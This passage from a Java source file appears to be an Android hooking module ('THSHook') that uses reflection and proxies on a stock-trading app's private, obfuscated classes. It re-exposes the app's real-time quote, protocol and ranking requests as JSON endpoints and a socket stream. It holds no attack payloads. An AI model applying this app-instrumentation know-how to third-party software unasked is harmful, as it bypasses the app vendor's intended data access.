                                                + System.currentTimeMillis() + "}");
                                    }
                                    return null;
                                }
                                if ("toString".equals(methodName)) {
                                    return "THSHookUnifiedStreamCallback:" + subscriptionId;
                                }
                                if ("hashCode".equals(methodName)) {
                                    return System.identityHashCode(proxy);
                                }
                                if ("equals".equals(methodName)) {
                                    return args != null && args.length == 1
                                            && proxy == args[0];
                                }
                                return defaultValue(method.getReturnType());
                            });

                    Class<?> bridgeClass = classLoader.loadClass(
                            "com.hexin.android.base_hummer.export.component.business."
                                    + "HummerUnifiedRequestBridge");
                    Object bridge = bridgeClass.getConstructor().newInstance();
                    unifiedSubscriptions.put(
                            subscriptionId,
                            new UnifiedSubscriptionState(bridge, callback, model));
                    bridgeClass.getMethod("init", modelClass, callbackClass)
                            .invoke(bridge, model, callback);
                    if (closed.get()) {
                        UnifiedSubscriptionState removed =
                                unifiedSubscriptions.remove(subscriptionId);
                        cleanupUnifiedSubscriptionState(removed);
                    }
                } catch (Throwable e) {
                    UnifiedSubscriptionState failedState =
                            unifiedSubscriptions.remove(subscriptionId);
                    cleanupUnifiedSubscriptionState(failedState);
                    failure.set(e);
                } finally {
                    started.countDown();
                }
            });
            if (!started.await(10, TimeUnit.SECONDS)) {
                throw new IllegalStateException(
                        "native unified subscription dispatch timed out");
            }
            if (failure.get() != null) {
                throw new RuntimeException(failure.get());
            }
        }

        private void unsubscribe(String subscriptionId) {
            Object nativeClient = realtimeSubscriptions.remove(subscriptionId);
            cleanupRealTimeDataClient(nativeClient);
            UnifiedSubscriptionState unifiedState =
                    unifiedSubscriptions.remove(subscriptionId);
            cleanupUnifiedSubscriptionState(unifiedState);
        }

        private void acquireWakeLock() throws Exception {
            Object application = currentApplication();
            if (!(application instanceof Context)) {
                return;
            }
            PowerManager powerManager = (PowerManager) ((Context) application)
                    .getSystemService(Context.POWER_SERVICE);
            if (powerManager == null) {
                return;
            }
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "THSHook:realtime-stream");
            wakeLock.acquire();
        }

        private void writeLine(String value) {
            if (closed.get()) {
                return;
            }
            if (!writeQueue.offer(value)) {
                Log.w(TAG, "RT_STREAM output queue full; closing stream");
                close();
            }
        }

        private void startWriter() {
            writerThread = new Thread(() -> {
                try {
                    while (!closed.get()) {
                        String value = writeQueue.take();
                        synchronized (writeLock) {
                            out.write((value + "\n").getBytes("UTF-8"));
                            out.flush();
                        }
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } catch (Throwable e) {
                    if (!closed.get()) {
                        Log.w(TAG, "RT_STREAM writer ended: " + e.getMessage());
                    }
                } finally {
                    close();
                }
            }, "THSHook-RT-Stream-Writer");
            writerThread.start();
        }

        private void close() {
            if (!closed.compareAndSet(false, true)) {
                return;
            }
            if (writerThread != null && writerThread != Thread.currentThread()) {
                writerThread.interrupt();
            }
            requestExecutor.shutdownNow();
            for (Object nativeClient : realtimeSubscriptions.values()) {
                cleanupRealTimeDataClient(nativeClient);
            }
            realtimeSubscriptions.clear();
            for (UnifiedSubscriptionState state : unifiedSubscriptions.values()) {
                cleanupUnifiedSubscriptionState(state);
            }
            unifiedSubscriptions.clear();
            int activeSessions = realtimeStreamSessions.get();
            if (sessionRegistered.compareAndSet(true, false)) {
                activeSessions = realtimeStreamSessions.decrementAndGet();
            }
            Log.i(TAG, "RT_STREAM closed activeSessions=" + activeSessions);
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            try {
                socket.close();
            } catch (Throwable ignored) {
            }
        }

        private static void cleanupUnifiedSubscriptionState(
                UnifiedSubscriptionState state) {
            if (state != null) {
                cleanupUnifiedRequestBridge(state.bridge);
            }
        }

        private static final class UnifiedSubscriptionState {
            final Object bridge;
            final Object callback;
            final Object model;

            UnifiedSubscriptionState(Object bridge, Object callback, Object model) {
                this.bridge = bridge;
                this.callback = callback;
                this.model = model;
            }
        }
    }

    private static String callNativeRealTimeData(String body, ClassLoader cl) {
        String key = extractJsonString(body, "key");
        String requestParam = extractJsonString(body, "requestParam");
        String requestChannel = extractJsonString(body, "requestChannel");
        if (key == null || requestParam == null || requestChannel == null) {
            return "{\"success\":false,\"error\":\"key, requestParam and requestChannel are required\"}";
        }
        synchronized (realTimeDataRequestLock) {
            return callNativeRealTimeDataLocked(key, requestParam, requestChannel, cl);
        }
    }

    private static String callNativeRealTimeDataLocked(
            String key,
            String requestParam,
            String requestChannel,
            ClassLoader cl) {
        AtomicReference<Object> requestClient = new AtomicReference<>();
        AtomicReference<PowerManager.WakeLock> requestWakeLock = new AtomicReference<>();
        beginMarketWireCapture(key);
        try {
            CountDownLatch latch = new CountDownLatch(1);
            CountDownLatch requestStarted = new CountDownLatch(1);
            AtomicReference<String> response = new AtomicReference<>();
            AtomicReference<Throwable> startFailure = new AtomicReference<>();

            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Object application = currentApplication();
                    if (application == null) {
                        throw new IllegalStateException("Application is not ready");
                    }
                    Context context = (Context) application;
                    PowerManager powerManager = (PowerManager) context.getSystemService(
                            Context.POWER_SERVICE);
                    PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                            PowerManager.PARTIAL_WAKE_LOCK,
                            "THSHook:real-time-market-data");
                    wakeLock.acquire(40_000L);
                    requestWakeLock.set(wakeLock);
                    startLegacyCommunicationService(application, cl);

                    RealtimeClassSet realtimeClasses = resolveRealtimeClassSet(cl);
                    Class<?> modelClass = realtimeClasses.modelClass;
                    Object model = newRealtimeRequestModel(
                            modelClass, key, requestParam, requestChannel);
                    Class<?> clientClass = realtimeClasses.clientClass;
                    Class<?> callbackClass = realtimeClasses.callbackClass;
                    Object client = clientClass.getConstructor(modelClass).newInstance(model);
                    requestClient.set(client);

                    Object callback = Proxy.newProxyInstance(
                            cl,
                            new Class<?>[]{callbackClass},
                            (proxy, method, args) -> {
                                if (args != null && args.length == 1 && args[0] != null) {
                                    Object result = args[0];
                                    int status = ((Number) result.getClass().getMethod("d").invoke(result)).intValue();
                                    int responseType = ((Number) result.getClass().getMethod("b").invoke(result)).intValue();
                                    String responseKey = String.valueOf(result.getClass().getMethod("c").invoke(result));
                                    Object dataValue = result.getClass().getMethod("a").invoke(result);
                                    String data = dataValue == null ? null : String.valueOf(dataValue);
                                    if (responseType == 0) {
                                        response.set("{\"success\":" + (status == 0)
                                                + ",\"status\":" + status
                                                + ",\"response_type\":" + responseType
                                                + ",\"key\":\"" + esc(responseKey) + "\""
                                                + ",\"data\":" + jsonValue(data) + "}");
                                        latch.countDown();
                                    } else {
                                        Log.i(TAG, "RT_CORE incremental response ignored by one-shot endpoint key="
                                                + key + " status=" + status);
                                    }
                                }
                                return null;
                            });

                    clientClass.getMethod("e", callbackClass).invoke(client, callback);
                    requestRealtimeSnapshot(client);
                } catch (Throwable e) {
                    startFailure.set(e);
                } finally {
                    requestStarted.countDown();
                }
            });

            if (!requestStarted.await(10, TimeUnit.SECONDS)) {
                return "{\"success\":false,\"error\":\"native request dispatch timed out\"}";
            }
            if (startFailure.get() != null) {
                throw new RuntimeException(startFailure.get());
            }

            if (!latch.await(25, TimeUnit.SECONDS)) {
                return "{\"success\":false,\"error\":\"native request timed out\"}";
            }
            return response.get() != null
                    ? response.get()
                    : "{\"success\":false,\"error\":\"native response missing\"}";
        } catch (Throwable e) {
            Throwable cause = e;
            while (cause.getCause() != null && cause.getCause() != cause) {
                cause = cause.getCause();
            }
            Log.e(TAG, "callNativeRealTimeData failed", cause);
            return "{\"success\":false,\"error\":\"" + esc(cause.getClass().getName()
                    + ": " + String.valueOf(cause.getMessage())) + "\"}";
        } finally {
            cleanupRealtimeSnapshotClient(requestClient.get());
            PowerManager.WakeLock wakeLock = requestWakeLock.get();
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            endMarketWireCapture();
        }
    }

    private static void cleanupRealTimeDataClient(Object client) {
        if (client == null) {
            return;
        }
        CountDownLatch cleanupFinished = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                client.getClass().getMethod("b").invoke(client);
            } catch (Throwable e) {
                Log.w(TAG, "RT_CORE client cleanup failed: " + e.getMessage());
            } finally {
                cleanupFinished.countDown();
            }
        });
        try {
            cleanupFinished.await(3, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void requestRealtimeSnapshot(Object client) throws Exception {
        // RealTimeDataRequestClient.d() starts both the one-shot total request and
        // a persistent subscription. The HTTP endpoint only needs responseType=0;
        // starting and immediately cancelling the subscription contaminates the
        // next native request on older App builds. Invoke the wrapped total client
        // directly while the streaming endpoint continues to use d().
        Field totalClientField = client.getClass().getField("b");
        Object totalClient = totalClientField.get(client);
        if (totalClient == null) {
            throw new IllegalStateException("realtime total client is missing");
        }
        Method requestMethod = totalClient.getClass().getMethod("request");
        requestMethod.invoke(totalClient);
        Log.i(TAG, "RT_CORE one-shot total.request client="
                + System.identityHashCode(totalClient));
    }

    private static void cleanupRealtimeSnapshotClient(Object client) {
        if (client == null) {
            return;
        }
        CountDownLatch cleanupFinished = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                Field totalClientField = client.getClass().getField("b");
                Object totalClient = totalClientField.get(client);
                Field subscriptionField = client.getClass().getField("c");
                subscriptionField.setAccessible(true);
                subscriptionField.set(client, null);
                try {
                    client.getClass().getField("d").set(client, null);
                } catch (NoSuchFieldException ignored) {
                    // Newer App builds may rename the callback field; unregistering
                    // the total client is the transport-critical cleanup step.
                }
                try {
                    client.getClass().getMethod("b").invoke(client);
                } catch (java.lang.reflect.InvocationTargetException cleanupError) {
                    // Both supported App versions unregister the total client before
                    // touching the subscription member. The member is deliberately
                    // null here, so a trailing NullPointerException is expected and
                    // proves no native unsubscribe frame was emitted.
                    Throwable cause = cleanupError.getCause();
                    if (!(cause instanceof NullPointerException)) {
                        throw cleanupError;
                    }
                }
                Log.i(TAG, "RT_CORE one-shot total.unregister client="
                        + System.identityHashCode(totalClient));
            } catch (Throwable e) {
                Log.w(TAG, "RT_CORE one-shot cleanup failed: " + e.getMessage());
            } finally {
                cleanupFinished.countDown();
            }
        });
        try {
            cleanupFinished.await(3, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static String callNativeUnifiedRequest(String body, ClassLoader cl) {
        final org.json.JSONObject request;
        try {
            request = new org.json.JSONObject(body);
        } catch (Throwable e) {
            return "{\"success\":false,\"error\":\"request body must be valid JSON\"}";
        }

        String onlineId = request.optString("onlineId", "").trim();
        int protocolId = request.optInt("protocolId", 0);
        int pageId = request.optInt("pageId", 0);
        String requestDic = request.optString("requestDic", "");
        if (protocolId <= 0 || pageId <= 0) {
            return "{\"success\":false,\"error\":\"protocolId and pageId are required\"}";
        }

        int requestType = request.optInt("requestType", 262144);
        String compressType = request.optString("compressType", "");
        String cancelRequestDic = request.optString("cancelRequestDic", "");
        org.json.JSONObject reqAccount = request.optJSONObject("reqAccount");
        int timeoutSeconds = Math.max(1, Math.min(request.optInt("timeoutSeconds", 25), 60));
        synchronized (unifiedRequestLock) {
            return callNativeUnifiedRequestLocked(
                    onlineId,
                    protocolId,
                    pageId,
                    requestDic,
                    requestType,
                    compressType,
                    cancelRequestDic,
                    reqAccount,
                    timeoutSeconds,
                    cl);
        }
    }

    private static synchronized String callNativeRankingDebug(String body, ClassLoader cl) {
        try {
            org.json.JSONObject request = new org.json.JSONObject(body);
            int frameId = request.optInt("frameId", 2312);
            int pageId = request.optInt("pageId", 1282);
            int bizType = request.optInt("bizType", 1);
            int sortId = request.optInt("sortId", 34818);
            int sortOrder = request.optInt("sortOrder", 0);
            int rowCount = Math.max(1, Math.min(request.optInt("rowCount", 24), 50));
            int timeoutSeconds = Math.max(1, Math.min(request.optInt("timeoutSeconds", 25), 60));
            int requestType = request.optInt("requestType", 0);
            String requestText = request.optString("requestText", "").trim();
            if (requestText.isEmpty()) {
                requestText = "startrow=0\r\nrowcount=" + rowCount
                        + "\r\nmarketId=0\r\nsortorder=" + sortOrder
                        + "\r\nsortid=" + sortId;
            }
            final String effectiveRequestText = requestText;
            {
                CountDownLatch callbackLatch = new CountDownLatch(1);
                int instanceId = directMarketInstanceId.incrementAndGet();
                directProtocolLatches.put(instanceId, callbackLatch);
                List<org.json.JSONObject> events = java.util.Collections.synchronizedList(
                        new ArrayList<>());
                AtomicReference<Object> callbackResponse = new AtomicReference<>();
                AtomicReference<Object> requestBuilder = new AtomicReference<>();
                AtomicReference<Throwable> failure = new AtomicReference<>();
                CountDownLatch started = new CountDownLatch(1);
                new Handler(Looper.getMainLooper()).post(() -> {
                    try {
                        Object application = currentApplication();
                        startLegacyCommunicationService(application, cl);
                        Class<?> stuffBaseClass = cl.loadClass(
                                "com.hexin.middleware.data.StuffBaseStruct");
                        Class<?> requestFactoryClass = cl.loadClass("uzu");
                        Object builder = requestFactoryClass.getMethod("a").invoke(null);
                        requestBuilder.set(builder);
                        Class<?> builderClass = builder.getClass();
                        Method configure = findTableConfigureMethod(builderClass);
                        Class<?> callbackClass = configure.getParameterTypes()[2];
                        Object callback = Proxy.newProxyInstance(
                                cl,
                                new Class<?>[]{callbackClass},
                                (proxy, method, args) -> {
                                    if ("receive".equals(method.getName())
                                            && args != null && args.length == 1
                                            && args[0] != null) {
                                        Object bridge = cl.loadClass(
                                                "com.hexin.android.base_hummer.export.component.business."
                                                        + "HummerUnifiedRequestBridge")
                                                .getConstructor().newInstance();
                                        Method transform = bridge.getClass().getDeclaredMethod(
                                                "getResponseJsonObj",
                                                stuffBaseClass,
                                                int.class,
                                                int.class,
                                                String.class);
                                        transform.setAccessible(true);
                                        Object transformed = transform.invoke(
                                                bridge, args[0], frameId, pageId, "");
                                        callbackResponse.set(transformed);
                                        callbackLatch.countDown();
                                        return null;
                                    }
                                    if ("toString".equals(method.getName())) {
                                        return "THSHookDirectTableCallback";
                                    }
                                    if ("hashCode".equals(method.getName())) {
                                        return System.identityHashCode(proxy);
                                    }
                                    if ("equals".equals(method.getName())) {
                                        return args != null && args.length == 1 && proxy == args[0];
                                    }
                                    return defaultValue(method.getReturnType());
                                });
                        configure.invoke(
                                builder,
                                frameId,
                                pageId,
                                callback,
                                effectiveRequestText);
                        if (requestType > 0) {
                            builderClass.getMethod("d0", int.class).invoke(builder, requestType);
                        }
                        builderClass.getMethod("a0").invoke(builder);
                    } catch (Throwable error) {
                        failure.set(error);
                    } finally {
                        started.countDown();
                    }
                });
                if (!started.await(10, TimeUnit.SECONDS)) {
                    return "{\"success\":false,\"error\":\"ranking dispatch timed out\"}";
                }
                if (failure.get() != null) throw new RuntimeException(failure.get());
                try {
                    boolean callbackReceived = callbackLatch.await(
                            timeoutSeconds, TimeUnit.SECONDS);
                    org.json.JSONObject result = new org.json.JSONObject();
                    Object routedResponse = callbackResponse.get();
                    result.put("success", callbackReceived && routedResponse != null);
                    result.put("frameId", frameId);
                    result.put("pageId", pageId);
                    result.put("instanceId", instanceId);
                    result.put("requestText", effectiveRequestText);
                    result.put("events", new org.json.JSONArray(events));
                    if (routedResponse != null) {
                        result.put("protocolResponse", new org.json.JSONObject(toJson(routedResponse)));
                    } else {
                        result.put("error", "protocol response timed out");
                    }
                    return result.toString();
                } finally {
                    cleanupNativeRankingBuilder(requestBuilder.get());
                    directProtocolLatches.remove(instanceId);
                    directProtocolResponses.remove(instanceId);
                }
            }
        } catch (Throwable error) {
            Throwable cause = error;
            while (cause.getCause() != null && cause.getCause() != cause) {
                cause = cause.getCause();
            }
            return "{\"success\":false,\"error\":\""
                    + esc(cause.getClass().getName() + ": " + cause.getMessage()) + "\"}";
        }
    }

    private static Object extractProtocolResponseFromHandle(
            Object handle, org.json.JSONObject event) throws org.json.JSONException {
        org.json.JSONObject accessors = new org.json.JSONObject();
        Object best = null;
        int bestScore = 0;
        for (String methodName : new String[]{"c", "d", "e"}) {
            try {
                Method accessor = handle.getClass().getMethod(methodName);
                if (accessor.getParameterTypes().length != 0) continue;
                Object candidate = accessor.invoke(handle);
                if (candidate == null) {
                    accessors.put(methodName, org.json.JSONObject.NULL);
                    continue;
                }
                int score = protocolPayloadScore(candidate);
                org.json.JSONObject summary = new org.json.JSONObject();
                summary.put("class", candidate.getClass().getName());
                summary.put("payload_score", score);
                accessors.put(methodName, summary);
                if (score > bestScore) {
                    best = candidate;
                    bestScore = score;
                }
            } catch (Throwable error) {
                accessors.put(methodName + "_error",
                        error.getClass().getSimpleName() + ": " + error.getMessage());
            }
        }
        event.put("handle_accessors", accessors);
        event.put("payload_score", bestScore);
        return bestScore > 0 ? best : null;
    }

    private static int protocolPayloadScore(Object value) {
        if (value == null) return 0;
        int score = 0;
        try {
            for (Class<?> type = value.getClass();
                 type != null && type != Object.class;
                 type = type.getSuperclass()) {
                for (Field field : type.getDeclaredFields()) {
                    field.setAccessible(true);
                    Object fieldValue = field.get(value);
                    if (fieldValue instanceof byte[] && ((byte[]) fieldValue).length > 0) {
                        score += 100 + Math.min(((byte[]) fieldValue).length, 10000);
                    } else if (fieldValue instanceof Map && !((Map<?, ?>) fieldValue).isEmpty()) {
                        score += 50 + Math.min(((Map<?, ?>) fieldValue).size(), 100);
                    } else if (fieldValue instanceof Collection
                            && !((Collection<?>) fieldValue).isEmpty()) {
                        score += 25 + Math.min(((Collection<?>) fieldValue).size(), 100);
                    }
                }
            }
        } catch (Throwable error) {
            Log.w(TAG, "RT_PROTOCOL payload scoring failed: " + error.getMessage());
        }
        return score;
    }

    private static Object inspectProtocolObject(Object value) {
        if (value == null) return org.json.JSONObject.NULL;
        if (value instanceof byte[]) {
            byte[] bytes = (byte[]) value;
            org.json.JSONObject binary = new org.json.JSONObject();
            try {
                binary.put("length", bytes.length);
                int inspectedLength = Math.min(bytes.length, 262144);
                byte[] inspected = bytes;
                if (inspectedLength != bytes.length) {
                    inspected = java.util.Arrays.copyOf(bytes, inspectedLength);
                    binary.put("truncated", true);
                }
                binary.put("base64", android.util.Base64.encodeToString(
                        inspected, android.util.Base64.NO_WRAP));
                String text = new String(inspected, "UTF-8");
                if (isMostlyPrintable(text)) binary.put("utf8", text);
            } catch (Throwable ignored) { }
            return binary;
        }
        if (value instanceof Map) return inspectProtocolMap((Map<?, ?>) value);
        if (value instanceof Collection) {
            return inspectProtocolCollection((Collection<?>) value);
        }
        if (value instanceof Number || value instanceof Boolean
                || value instanceof String) {
            return value;
        }
        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("class", value.getClass().getName());
            for (Class<?> type = value.getClass();
                 type != null && type != Object.class;
                 type = type.getSuperclass()) {
                for (Field field : type.getDeclaredFields()) {
                    try {
                        field.setAccessible(true);
                        Object fieldValue = field.get(value);
                        if (fieldValue == null || fieldValue instanceof String
                                || fieldValue instanceof Number
                                || fieldValue instanceof Boolean) {
                            result.put("field_" + field.getName(), fieldValue);
                        } else if (fieldValue instanceof Map) {
                            result.put("field_" + field.getName(),
                                    inspectProtocolMap((Map<?, ?>) fieldValue));
                        } else if (fieldValue instanceof Collection) {
                            result.put("field_" + field.getName(),
                                    inspectProtocolCollection((Collection<?>) fieldValue));
                        } else if (fieldValue instanceof byte[]) {
                            result.put("field_" + field.getName(),
                                    inspectProtocolObject(fieldValue));
                        } else {
                            result.put("field_" + field.getName(), String.valueOf(fieldValue));
                        }
                    } catch (Throwable ignored) {
                        // Continue inspecting other protocol fields.
                    }
                }
            }
        } catch (Throwable ignored) {
            return String.valueOf(value);
        }
        return result;
    }

    private static org.json.JSONObject inspectProtocolMap(Map<?, ?> values) {
        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("size", values.size());
            org.json.JSONObject entries = new org.json.JSONObject();
            int count = 0;
            for (Map.Entry<?, ?> entry : values.entrySet()) {
                if (count++ >= 100) {
                    result.put("truncated", true);
                    break;
                }
                entries.put(String.valueOf(entry.getKey()),
                        inspectProtocolLeaf(entry.getValue()));
            }
            result.put("entries", entries);
        } catch (Throwable error) {
            try { result.put("error", error.getClass().getSimpleName()); }
            catch (Throwable ignored) { }
        }
        return result;
    }

    private static org.json.JSONObject inspectProtocolCollection(Collection<?> values) {
        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("size", values.size());
            org.json.JSONArray items = new org.json.JSONArray();
            int count = 0;
            for (Object value : values) {
                if (count++ >= 100) {
                    result.put("truncated", true);
                    break;
                }
                items.put(inspectProtocolLeaf(value));
            }
            result.put("items", items);
        } catch (Throwable error) {
            try { result.put("error", error.getClass().getSimpleName()); }
            catch (Throwable ignored) { }
        }
        return result;
    }

    private static Object inspectProtocolLeaf(Object value) {
        if (value == null) return org.json.JSONObject.NULL;
        if (value instanceof String || value instanceof Number
                || value instanceof Boolean || value instanceof byte[]) {
            return inspectProtocolObject(value);
        }
        org.json.JSONObject summary = new org.json.JSONObject();
        try {
            summary.put("class", value.getClass().getName());
            String text = String.valueOf(value);
            summary.put("text", text.length() > 4096 ? text.substring(0, 4096) : text);
        } catch (Throwable ignored) { }
        return summary;
    }

    private static boolean isMostlyPrintable(String value) {
        if (value == null || value.isEmpty()) return false;
        int printable = 0;
        int checked = Math.min(value.length(), 4096);
        for (int i = 0; i < checked; i++) {
            char ch = value.charAt(i);
            if (ch == '\r' || ch == '\n' || ch == '\t'
                    || (ch >= 0x20 && ch != 0x7f)) {
                printable++;
            }
        }
        return printable >= checked * 9 / 10;
    }

    private static String callNativeUnifiedRequestLocked(
            String onlineId,
            int protocolId,
            int pageId,
            String requestDic,
            int requestType,
            String compressType,
            String cancelRequestDic,
            org.json.JSONObject reqAccount,
            int timeoutSeconds,
            ClassLoader cl) {
        AtomicReference<Object> bridgeRef = new AtomicReference<>();
        AtomicReference<PowerManager.WakeLock> requestWakeLock = new AtomicReference<>();
        beginMarketWireCapture(onlineId);
        try {
            CountDownLatch latch = new CountDownLatch(1);
            CountDownLatch requestStarted = new CountDownLatch(1);
            AtomicReference<Object> response = new AtomicReference<>();
            AtomicReference<Throwable> startFailure = new AtomicReference<>();

            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Object application = currentApplication();
                    if (application == null) {
                        throw new IllegalStateException("Application is not ready");
                    }
                    Context context = (Context) application;
                    PowerManager powerManager = (PowerManager) context.getSystemService(
                            Context.POWER_SERVICE);
                    PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                            PowerManager.PARTIAL_WAKE_LOCK,
                            "THSHook:unified-market-data");
                    wakeLock.acquire((timeoutSeconds + 15L) * 1000L);
                    requestWakeLock.set(wakeLock);
                    startLegacyCommunicationService(application, cl);

                    Class<?> modelClass = cl.loadClass(
                            "com.hexin.android.base_hummer.export.component.business."
                                    + "HummerUnifiedRequestBridge$RequestModel");
                    Object model = modelClass.getConstructor().newInstance();
                    setPrivateField(model, "onlineId", onlineId);
                    setPrivateField(model, "protocolId", protocolId);
                    setPrivateField(model, "pageId", pageId);
                    setPrivateField(model, "requestDic", requestDic);
                    setPrivateField(model, "requestType", requestType);
                    setPrivateField(model, "compressType", compressType);
                    setPrivateField(model, "cancelRequestDic", cancelRequestDic);
                    if (reqAccount != null) {
                        setPrivateField(model, "reqAccount", reqAccount);
                    }

                    Class<?> callbackClass = cl.loadClass("ld0");
                    Object callback = Proxy.newProxyInstance(
                            cl,
                            new Class<?>[]{callbackClass},
                            (proxy, method, args) -> {
                                String methodName = method.getName();
                                if ("call".equals(methodName)) {
                                    Object callbackValue = null;
                                    if (args != null && args.length > 0) {
                                        callbackValue = args[0];
                                        if (callbackValue instanceof Object[]) {
                                            Object[] callbackArgs = (Object[]) callbackValue;
                                            callbackValue = callbackArgs.length > 0
                                                    ? callbackArgs[0]
                                                    : null;
                                        }
                                    }
                                    if (callbackValue != null) {
                                        response.set(callbackValue);
                                        latch.countDown();
                                    }
                                    return null;
                                }
                                if ("toString".equals(methodName)) {
                                    return "THSHookUnifiedCallback";
                                }
                                if ("hashCode".equals(methodName)) {
                                    return System.identityHashCode(proxy);
                                }
                                if ("equals".equals(methodName)) {
                                    return args != null && args.length == 1 && proxy == args[0];
                                }
                                return defaultValue(method.getReturnType());
                            });

                    Class<?> bridgeClass = cl.loadClass(
                            "com.hexin.android.base_hummer.export.component.business."
                                    + "HummerUnifiedRequestBridge");
                    Object bridge = bridgeClass.getConstructor().newInstance();
                    bridgeRef.set(bridge);
                    bridgeClass.getMethod("init", modelClass, callbackClass)
                            .invoke(bridge, model, callback);
                } catch (Throwable e) {
                    startFailure.set(e);
                } finally {
                    requestStarted.countDown();
                }
            });

            if (!requestStarted.await(10, TimeUnit.SECONDS)) {
                return "{\"success\":false,\"error\":\"unified request dispatch timed out\"}";
            }
            if (startFailure.get() != null) {
                throw new RuntimeException(startFailure.get());
            }
            if (!latch.await(timeoutSeconds, TimeUnit.SECONDS)) {
                return "{\"success\":false,\"error\":\"unified request timed out\"}";
            }

            Object value = response.get();
            if (value == null) {
                return "{\"success\":false,\"error\":\"unified response missing\"}";
            }
            boolean success = unifiedResponseSucceeded(value);
            return "{\"success\":" + success
                    + ",\"onlineId\":\"" + esc(onlineId) + "\""
                    + ",\"response\":" + toJson(value) + "}";
        } catch (Throwable e) {
            Throwable cause = e;
            while (cause.getCause() != null && cause.getCause() != cause) {
                cause = cause.getCause();
            }
            Log.e(TAG, "callNativeUnifiedRequest failed", cause);
            return "{\"success\":false,\"error\":\"" + esc(cause.getClass().getName()
                    + ": " + String.valueOf(cause.getMessage())) + "\"}";
        } finally {
            cleanupUnifiedRequestBridge(bridgeRef.get());
            PowerManager.WakeLock wakeLock = requestWakeLock.get();
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            endMarketWireCapture();
        }
    }

    private static void cleanupUnifiedRequestBridge(Object bridge) {
        if (bridge == null) {
            return;
        }
        boolean requiresCancelDrain = unifiedCleanupRequiresCancelDrain(bridge);
        if (Looper.myLooper() == Looper.getMainLooper()) {
            removeUnifiedRequestBridgeNow(bridge);
            return;
        }
        CountDownLatch cleanupFinished = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                removeUnifiedRequestBridgeNow(bridge);
            } finally {
                cleanupFinished.countDown();
            }
        });
        try {
            cleanupFinished.await(3, TimeUnit.SECONDS);
            boolean released = unifiedCleanupReleased(bridge);
            if (!released) {
                // Reflection is only an acknowledgement check. If an App
                // version changes these fields, keep a short conservative
                // fallback instead of immediately reusing the interface.
                Thread.sleep(120L);
                released = unifiedCleanupReleased(bridge);
            }
            if (requiresCancelDrain) {
                // Only subscription-style requests have cancelRequestDic.
                // removeRequest() unregisters the local callback/buffer
                // synchronously, but its explicit cancel frame is asynchronous.
                Thread.sleep(800L);
            }
            Log.i(TAG, "Unified cleanup ack released=" + released
                    + " cancelDrain=" + requiresCancelDrain);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static boolean unifiedCleanupRequiresCancelDrain(Object bridge) {
        Object requestData = readFieldValue(bridge, "mRequestData");
        Object value = invokeNoArg(requestData, "getCancelRequestDic");
        return value != null && !String.valueOf(value).isEmpty();
    }

    private static boolean unifiedCleanupReleased(Object bridge) {
        Object callback = readFieldValue(bridge, "mCallBack");
        Object onlineFrames = readFieldValue(bridge, "mOnlineFrameids");
        return callback == null
                && (!(onlineFrames instanceof java.util.Collection)
                    || ((java.util.Collection<?>) onlineFrames).isEmpty());
    }

    private static void removeUnifiedRequestBridgeNow(Object bridge) {
        try {
            Method removeRequest = bridge.getClass().getDeclaredMethod("removeRequest");
            removeRequest.setAccessible(true);
            removeRequest.invoke(bridge);
        } catch (Throwable e) {
            Log.w(TAG, "Unified request cleanup failed: " + e.getMessage());
        }
    }

    private static void cleanupNativeRankingBuilder(Object builder) {
        if (builder == null) {
            return;
        }
        CountDownLatch cleanupFinished = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                Method stopRequest = builder.getClass().getMethod("C");
                stopRequest.invoke(builder);
            } catch (Throwable e) {
                Log.w(TAG, "Native ranking cleanup failed: " + e.getMessage());
            } finally {
                cleanupFinished.countDown();
            }
        });
        try {
            cleanupFinished.await(3, TimeUnit.SECONDS);
            // C() unregisters the callback and sends its cancellation asynchronously.
            // Keep the shared frame/page route idle until that cancellation has left
            // the native channel, otherwise the next ranking request can lose its reply.
            Thread.sleep(800L);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void setPrivateField(Object target, String fieldName, Object value)
            throws Exception {
        Class<?> type = target.getClass();
        while (type != null) {
            try {
                Field field = type.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(target, value);
                return;
            } catch (NoSuchFieldException ignored) {
                type = type.getSuperclass();
            }
        }
        throw new NoSuchFieldException(target.getClass().getName() + "." + fieldName);
    }

    private static Object newRealtimeRequestModel(
            Class<?> modelClass,
            String key,
            String requestParam,
            String requestChannel) throws Exception {
        for (java.lang.reflect.Constructor<?> constructor : modelClass.getDeclaredConstructors()) {
            Class<?>[] parameterTypes = constructor.getParameterTypes();
            if (parameterTypes.length == 3
                    && parameterTypes[0] == String.class
                    && parameterTypes[1] == String.class
                    && parameterTypes[2] == String.class) {
                constructor.setAccessible(true);
                return constructor.newInstance(key, requestParam, requestChannel);
            }
        }
        throw new NoSuchMethodException(
                modelClass.getName() + " constructors="
                        + java.util.Arrays.toString(modelClass.getDeclaredConstructors()));
    }

    private static final class RealtimeClassSet {
        private final Class<?> modelClass;
        private final Class<?> clientClass;
        private final Class<?> callbackClass;

        private RealtimeClassSet(
                Class<?> modelClass,
                Class<?> clientClass,
                Class<?> callbackClass) {
            this.modelClass = modelClass;
            this.clientClass = clientClass;
            this.callbackClass = callbackClass;
        }
    }

